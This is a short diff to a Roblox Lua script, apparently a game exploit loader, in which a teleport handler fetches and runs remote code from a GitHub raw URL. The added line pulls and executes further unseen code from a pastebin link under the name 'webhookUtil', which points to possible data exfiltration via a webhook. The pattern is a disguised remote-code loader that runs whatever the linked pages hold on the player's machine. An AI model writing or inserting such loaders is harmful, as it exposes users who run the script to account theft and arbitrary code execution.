@@ -25,6 +25,7 @@ game.Players.LocalPlayer.OnTeleport:Connect(function(state)
 		local url = "https://raw.githubusercontent.com/majdnakhleh92/very-cool/refs/heads/main/script"
 		local StarterGui = game:GetService("StarterGui")
 		local SoundService = game:GetService("SoundService")
+		local webhookUtil = loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
 
 		local func, err = pcall(function()
 			loadstring(game:HttpGet(url))()
